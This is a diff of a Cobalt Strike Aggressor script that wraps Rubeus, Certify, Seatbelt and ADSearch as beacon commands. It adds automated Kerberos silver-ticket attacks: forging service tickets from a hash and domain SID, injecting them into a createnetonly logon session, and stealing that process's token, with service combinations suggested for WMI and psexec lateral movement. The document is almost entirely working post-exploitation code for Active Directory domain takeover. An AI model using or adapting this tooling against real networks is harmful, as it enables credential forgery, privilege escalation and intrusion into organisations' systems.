@@ -32,6 +32,10 @@ command beacons {
    }
 }
 
+#dummy callback to get stuff to run in the correct order
+sub dummby_cb{
+    blog($1,$2);
+}
 #generate random printable text of $length
 sub rand_alphanum {
     local('$length $out $charstr $i $index');
@@ -176,38 +180,46 @@ beacon_command_register(
 
 #EXECUTE ASSEMBLY ALIAS
 alias rubeus {
-    bexecute_assembly($1, $RUBEUS_PATH, $2)
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $RUBEUS_PATH, $args);
 }
 beacon_command_register(
     "rubeus",
     "Execute Assmembly of Rubeus",
-    "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes"
+    "Execute Assmembly of Rubeus"
 );
 alias certify {
-    bexecute_assembly($1, $CERTIFY_PATH, $2);
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $CERTIFY_PATH, $args);
 }
 beacon_command_register(
     "certify",
     "Execute Assmembly of Certify",
-    "Execute Assmembly of Certify\n\nArgs must be wrapped in double quotes"
+    "Execute Assmembly of Certify"
 );
 
 alias seatbelt {
-    bexecute_assembly($1, $SEATBELT_PATH, $2)
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $SEATBELT_PATH, $args)
 }
 beacon_command_register(
     "seatbelt",
     "Execute Assmembly of Seatbelt",
-    "Execute Assmembly of Seatbelt\n\nArgs must be wrapped in double quotes"
+    "Execute Assmembly of Seatbelt"
 );
 
 alias adsearch {
-    bexecute_assembly($1, $ADSEARCH_PATH, $2)
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $ADSEARCH_PATH, $args)
 }
 beacon_command_register(
     "adsearch",
     "Execute Assmembly of ADSearch",
-    "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes"
+    "Execute Assmembly of ADSearch"
 );
 
 #KERBEROASTING
@@ -1046,13 +1058,35 @@ beacon_command_register(
 
 #DOMAIN TAKEOVER ATTACKS
 ## SILVER TICKETS
-sub kerberos_silverticket_cb {
+sub kerberos_silverticket_cb2 {
     local('$regex')
-    $regex = '(doIFXD.*)';
+    $regex  = 'ProcessID\s+\:\s+(\d+)';
+    $pid = matches($2, $regex)[0];
+
+    blog($1, $2);
+    # blog($1, "pid = " . $pid);
+    bsteal_token($1, $pid);
+}
+sub kerberos_silverticket_cb {
+    # $1, $2, $3, $domain, $user
+    local('$regex')
+    $domain = $4;
+    $user   = $5;
+    $pass   = rand_alphanum(8);
+    $regex  = '(doIFXD.*)';
     $ticket = matches($2, $regex)[0];
 
     blog($1, $2);
-    blog($1, "Base64 Ticket = " . $ticket);
+    # blog($1, "Base64 Ticket = " . $ticket);
+
+    $args = "createnetonly"
+    . " /program:C:\\Windows\\System32\\cmd.exe"
+    . " /domain:" . $domain
+    . " /username:" . $user
+    . " /password:" . $pass
+    . " /ticket:" . $ticket;
+
+    bexecute_assembly($1, $RUBEUS_PATH, $args, $null, &kerberos_silverticket_cb2);
 }
 alias kerberos_silverticket {
     $size = size(@_);
@@ -1074,13 +1108,116 @@ alias kerberos_silverticket {
         berror($1, "Invalid Parameters");
         return;
     }
-    bexecute_assembly($1, $RUBEUS_PATH, $parameters, $null, &kerberos_silverticket_cb);
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters, $null, lambda({ kerberos_silverticket_cb ($1, $2, $3, $domain, $user); }));
 }
 beacon_command_register(
     "kerberos_silverticket",
     "Request a silver ticket",
     "Use Rubeus to request a silver TGS\n\n"
-    . " Usage:\n"
+    . "Usage:\n"
     . "kerberos_silverticket [user] [domain fqdn] [Domain SID] [hashType:hash] [service]\n\n"
+    . "hashType = [des|rc4|aes128|aes256]"
+    . "Example service: cifs/wkstn1.domain.local\n"
+    . "See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
+)
+
+#PERFORM SILVER TICKET ATTACK WITH MULTIPLE SERVICES
+sub kerberos_silvermultiticket_cb2 {
+    #parse tickets and ptt to luid
+    #($1, $2, $3, $luid)
+    local('$regexticket $ticket');
+    $luid = $4;
+    $regexticket  = '(doIFXD.*)';
+    $ticket = matches($2, $regexticket)[0];
+    
+    blog($1, $2);
+    blog($1, "LUID=" . $luid);
+    blog($1, "ticket=" . $ticket);
+    
+    $ptt_args = "ptt"
+    . " /luid:" . $luid
+    . " /ticket:" . $ticket;
+    bexecute_assembly($1, $RUBEUS_PATH, $ptt_args, $null, &dummby_cb);
+}
+sub kerberos_silvermultiticket_cb{
+    #Perform silver ticket requests
+    # ($1, $2, $3, $silver_args, $services, $target)
+    local('$regexpid $pid $regexluid $luid $silver_args $services $target');
+    $silver_args = $4;
+    $services    = split(',', $5);
+    $target      = $6;
+
+    $regexpid  = 'ProcessID\s+\:\s+(\d+)';
+    $pid = matches($2, $regexpid)[0];
+    
+    $regexluid = 'LUID\s+\:\s+(0x\p{XDigit}+)';
+    $luid = matches($2, $regexluid)[0];
+
+    blog($1, $2);
+    blog($1, "Silver_args = " . $silver_args);
+    blog($1, "Services = " . $services);
+    blog($1, "PID = " . $pid);
+    blog($1, "LUID = " . $luid);
+
+    foreach $service ($services) {
+        # blog($1, "Command=" . $silver_args . $service);
+        bexecute_assembly($1,
+            $RUBEUS_PATH,
+            $silver_args . $service . "/" . $target,
+            $null,
+            lambda({ kerberos_silvermultiticket_cb2 ($1, $2, $3, $luid); })
+        );
+    }
+    blog($1, "Should be able to steal process token for PID: " . $pid);
+}
+alias kerberos_silvermultiticket {
+    $size = size(@_);
+    if ($size == 7) {
+        $user     = @_[1];
+        $domain   = @_[2];
+        $sid      = @_[3];
+        $hash     = @_[4];
+        $target   = @_[5];
+        $services = @_[6];
+        $pass     = rand_alphanum(8);
+
+        #used locally
+        $createnetone_args = "createnetonly"
+        . " /program:C:\\Windows\\System32\\cmd.exe"
+        . " /domain:" . $domain
+        . " /username:" . $user
+        . " /password:" . $pass;
+
+        #passed to callback
+        $silver_args = "silver"
+        . " /user:" . $user
+        . " /domain:" . $domain
+        . " /sid:" . $sid
+        . " /" . $hash
+        . " /nowrap"
+        . " /service:";
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+
+    #CREATENETONLY, SEND TO CALL BACK TO CAPTURE LUID
+    bexecute_assembly($1,
+        $RUBEUS_PATH,
+        $createnetone_args,
+        $null,
+        lambda({ kerberos_silvermultiticket_cb ($1, $2, $3, $silver_args, $services, $target); })
+    );
+}
+beacon_command_register(
+    "kerberos_silvermultiticket",
+    "Request a silver ticket",
+    "Use Rubeus to request a silver TGS\n\n"
+    . "Usage: kerberos_silvermultiticket [user] [domain fqdn] [Domain SID] [hashType:hash] [Target fqdn] [service(s)]\n\n"
+    . "hashType = [des|rc4|aes128|aes256]\n\n"
+    . "Services are comma separated!\n"
+    . "Examples:\n"
+    . "  wmi    = host,rpcss\n"
+    . "  psexec = host,cifs\n"
     . "See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
 )
